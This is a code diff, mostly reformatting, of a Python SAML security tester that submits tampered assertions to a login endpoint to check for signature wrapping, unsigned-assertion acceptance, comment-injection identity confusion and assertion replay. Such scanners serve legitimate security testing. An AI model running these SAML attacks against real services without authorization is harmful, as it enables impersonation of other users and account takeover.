@@ -27,6 +27,7 @@ redirect / session cookie issued under the chosen identity), never reflection.
 All payloads are inert XML string manipulations — no live signing, no exploits
 beyond the target ACS's own decision.
 """
+
 from __future__ import annotations
 
 import base64
@@ -45,8 +46,8 @@ _ID_ATTR_RE = re.compile(r'(\bID=")([^"]*)(")')
 
 @dataclass
 class SAMLFinding:
-    technique: str              # xml_signature_wrapping | unsigned_assertion |
-                                # assertion_replay | comment_injection
+    technique: str  # xml_signature_wrapping | unsigned_assertion |
+    # assertion_replay | comment_injection
     confirmed: bool
     detail: str
     attacker_identity: str
@@ -56,9 +57,9 @@ class SAMLFinding:
 
 @dataclass
 class _SubmitResult:
-    granted: bool               # server issued an authenticated session
+    granted: bool  # server issued an authenticated session
     status: int
-    blob: str                   # searchable: body + Location + Set-Cookie
+    blob: str  # searchable: body + Location + Set-Cookie
 
     def identity_in(self, value: str) -> bool:
         return bool(value) and value in self.blob
@@ -128,9 +129,7 @@ class SAMLTester:
     # ---- tamper primitives ---------------------------------------------------
     @staticmethod
     def _set_nameid(xml: str, new: str) -> str:
-        return _NAMEID_RE.sub(
-            lambda m: m.group(1) + new + m.group(3), xml, count=1
-        )
+        return _NAMEID_RE.sub(lambda m: m.group(1) + new + m.group(3), xml, count=1)
 
     @staticmethod
     def _first_nameid(xml: str) -> str:
@@ -225,64 +224,91 @@ class SAMLTester:
         xsw_xml = self._variant_xsw()
         xsw = await self._submit(client, xsw_xml)
         if xsw.granted and xsw.identity_in(self.attacker_nameid) and not control_bypasses:
-            findings.append(SAMLFinding(
-                technique="xml_signature_wrapping", confirmed=True,
-                detail=("ACS granted a session under the attacker NameID from a "
+            findings.append(
+                SAMLFinding(
+                    technique="xml_signature_wrapping",
+                    confirmed=True,
+                    detail=(
+                        "ACS granted a session under the attacker NameID from a "
                         "wrapped forged assertion, while a naive NameID swap was "
                         "rejected — signature is validated over the original "
-                        "assertion but identity is read from the forged one."),
-                attacker_identity=self.attacker_nameid,
-                evidence={"status": xsw.status, "control_status": control.status,
-                          "control_bypasses": control_bypasses},
-                tampered_response=self._encode(xsw_xml),
-            ))
+                        "assertion but identity is read from the forged one."
+                    ),
+                    attacker_identity=self.attacker_nameid,
+                    evidence={
+                        "status": xsw.status,
+                        "control_status": control.status,
+                        "control_bypasses": control_bypasses,
+                    },
+                    tampered_response=self._encode(xsw_xml),
+                )
+            )
 
         # 2) Unsigned / stripped-signature assertion -------------------------------
         uns_xml = self._variant_unsigned()
         uns = await self._submit(client, uns_xml)
         if uns.granted and uns.identity_in(self.attacker_nameid) and not control_bypasses:
-            findings.append(SAMLFinding(
-                technique="unsigned_assertion", confirmed=True,
-                detail=("ACS accepted an assertion with its Signature removed and "
-                        "an attacker NameID — signatures are not enforced."),
-                attacker_identity=self.attacker_nameid,
-                evidence={"status": uns.status, "control_status": control.status},
-                tampered_response=self._encode(uns_xml),
-            ))
+            findings.append(
+                SAMLFinding(
+                    technique="unsigned_assertion",
+                    confirmed=True,
+                    detail=(
+                        "ACS accepted an assertion with its Signature removed and "
+                        "an attacker NameID — signatures are not enforced."
+                    ),
+                    attacker_identity=self.attacker_nameid,
+                    evidence={"status": uns.status, "control_status": control.status},
+                    tampered_response=self._encode(uns_xml),
+                )
+            )
 
         # 3) Comment-injection NameID confusion ------------------------------------
         cmt_xml = self._variant_comment()
         cmt = await self._submit(client, cmt_xml)
         # Confirmed only if the server resolved the *victim* prefix (attacker
         # gains victim identity) rather than the full attacker-owned subject.
-        if (cmt.granted and cmt.identity_in(self.victim_nameid)
-                and not cmt.identity_in(self._comment_injected_nameid())
-                and not control_bypasses):
-            findings.append(SAMLFinding(
-                technique="comment_injection", confirmed=True,
-                detail=("ACS resolved the NameID up to an injected XML comment, "
+        if (
+            cmt.granted
+            and cmt.identity_in(self.victim_nameid)
+            and not cmt.identity_in(self._comment_injected_nameid())
+            and not control_bypasses
+        ):
+            findings.append(
+                SAMLFinding(
+                    technique="comment_injection",
+                    confirmed=True,
+                    detail=(
+                        "ACS resolved the NameID up to an injected XML comment, "
                         f"granting a session as the victim '{self.victim_nameid}' "
                         "from an attacker-owned subject — canonicalization/parser "
-                        "confusion."),
-                attacker_identity=self.victim_nameid,
-                evidence={"status": cmt.status,
-                          "injected_nameid": self._comment_injected_nameid()},
-                tampered_response=self._encode(cmt_xml),
-            ))
+                        "confusion."
+                    ),
+                    attacker_identity=self.victim_nameid,
+                    evidence={
+                        "status": cmt.status,
+                        "injected_nameid": self._comment_injected_nameid(),
+                    },
+                    tampered_response=self._encode(cmt_xml),
+                )
+            )
 
         # 4) Assertion replay ------------------------------------------------------
         first = await self._submit(client, self.xml)
         if first.granted:
             second = await self._submit(client, self.xml)
             if second.granted:
-                findings.append(SAMLFinding(
-                    technique="assertion_replay", confirmed=True,
-                    detail=("ACS accepted the identical assertion twice — no "
-                            "one-time-use / replay cache is enforced."),
-                    attacker_identity=self._first_nameid(self.xml),
-                    evidence={"first_status": first.status,
-                              "second_status": second.status},
-                    tampered_response=self._encode(self.xml),
-                ))
+                findings.append(
+                    SAMLFinding(
+                        technique="assertion_replay",
+                        confirmed=True,
+                        detail=(
+                            "ACS accepted the identical assertion twice — no "
+                            "one-time-use / replay cache is enforced."
+                        ),
+                        attacker_identity=self._first_nameid(self.xml),
+                        evidence={"first_status": first.status, "second_status": second.status},
+                        tampered_response=self._encode(self.xml),
+                    )
+                )
 
         return findings
